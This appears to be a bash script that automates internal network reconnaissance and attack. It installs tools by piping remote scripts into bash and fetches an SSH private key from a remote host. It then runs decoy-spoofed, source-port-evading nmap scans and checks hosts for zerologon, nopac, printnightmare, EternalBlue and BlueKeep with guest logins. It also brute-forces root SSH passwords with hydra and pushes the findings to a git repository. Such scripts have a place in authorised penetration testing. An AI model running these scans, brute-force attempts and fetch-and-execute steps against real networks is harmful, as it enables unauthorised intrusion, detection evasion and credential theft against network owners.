# CONFIG
export RSUBNET=192.168.56.0/24
export LHOST=192.168.56.1
export REPO='githubrepo.com'
export KEY='mykey.com'

# INSTALL DPENDENCIES
echo "Remember to use it like: bash -x ./script"
read waiting

sudo apt update
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
sudo apt install golang -y
go install github.com/sensepost/gowitness@latest; sudo mv $HOME/go/bin/gowitness /usr/sbin
curl https://raw.githubusercontent.com/josemlwdf/CTFEnum/main/install.sh|bash

# SETUP
curl -s $KEY -o ~/.ssh/id_rsa
chmod 400 ~/.ssh/id_rsa
git clone $REPO
ln -sf "`pwd`/PTEST" "`echo ~`/home"
cd ~/home
curl -s https://raw.githubusercontent.com/josemlwdf/random_scripts/refs/heads/main/push -o push
chmod +x push
mkdir -p vulns
mkdir -p ip_files
mkdir -p nmap
mkdir -p tmp

# TESTS
nmap -sn -PE $RSUBNET -D RND:5 --source-port 53 --disable-arp-ping -oG nmap/full_hosts.txt
cat nmap/full_hosts.txt | grep "Status: Up" |awk '{print $2}' > ip_files/full_hosts_ips.txt
gowitness scan file -f ip_files/full_hosts_ips.txt --threads 50 --ports-medium --write-none
nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sS -Pn -D RND:5 --source-port 53  -p 445 -oG nmap/windows_hosts.txt
nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sS -Pn -p 22 -D RND:5 --source-port 53 -oG nmap/linux_hosts.txt
cat nmap/windows_hosts.txt | grep 445/open |awk '{print $2}' > ip_files/windows_hosts_ips.txt
nmap -iL ip_files/windows_hosts_ips.txt --disable-arp-ping -n -Pn -D RND:5 --source-port 53 -p 445 -sCV | tee vulns/nmap_smb_scan.txt
nmap -iL ip_files/windows_hosts_ips.txt --disable-arp-ping -n -sS -Pn -D RND:5 --source-port 53 -p 88 -oG nmap/ad.txt
nmap -iL ip_files/full_hosts_ips.txt --disable-arp-ping -n -sCV -Pn -D RND:5 --source-port 53 -p 3389 -oG nmap/rdp_hosts.txt
cat nmap/ad.txt | grep 88/open |awk '{print $2}' > ip_files/ad_hosts_ips.txt
cat nmap/rdp_hosts.txt | grep 3389/open |awk '{print $2}' > ip_files/rdp_hosts_ips.txt
for AD_IP in $(cat ip_files/ad_hosts_ips.txt); do ctfenum $AD_IP; done

echo ' ' >> tmp/guest.txt
echo 'guest' >> tmp/guest.txt
echo 'invité' >> tmp/guest.txt

nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M nopac | grep '^SMB' | tee vulns/nopac_scan.txt
nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M zerologon | grep '^SMB' | tee vulns/zerologon.txt
nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M enum_ca | grep '^SMB' | tee vulns/certificates.txt
nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M printnightmare | grep '^SMB' | tee vulns/printing_nightmare.txt
nxc smb ip_files/ad_hosts_ips.txt -u tmp/guest.txt -p "" -M smbghost | grep '^SMB' | tee vulns/smbghost.txt
nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' --shares | grep '^SMB' | tee vulns/nxc_smb_map.txt
nxc smb ip_files/windows_hosts_ips.txt -u tmp/guest.txt -p '' -M ms17-010 | grep '^SMB' | tee vulns/eternal_blue_scan.txt

for RDP_IP in $(cat ip_files/rdp_hosts_ips.txt); do msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RDP_CLIENT_IP $LHOST;set rhosts $RDP_IP;run;exit;" | tee -a bluekeep_scan.txt; done
cat nmap/linux_hosts.txt | grep 22/open |awk '{print $2}' > ip_files/linux_hosts_ips.txt
echo 'rootroot' >> tmp/pws.txt
echo 'ROOT' >> tmp/pws.txt
echo 'Root' >> tmp/pws.txt
echo 'ROOTROOT' >> tmp/pws.txt
echo 't00r' >> tmp/pws.txt
hydra -l root -P tmp/pws.txt -e nsr -t 4 -M ip_files/linux_hosts_ips.txt ssh | grep 'login' | grep 'password' | tee vulns/ssh_bruteforce.txt

# EXPORT
git add .
git commit -m "Initial Recon data: `date`"
git push
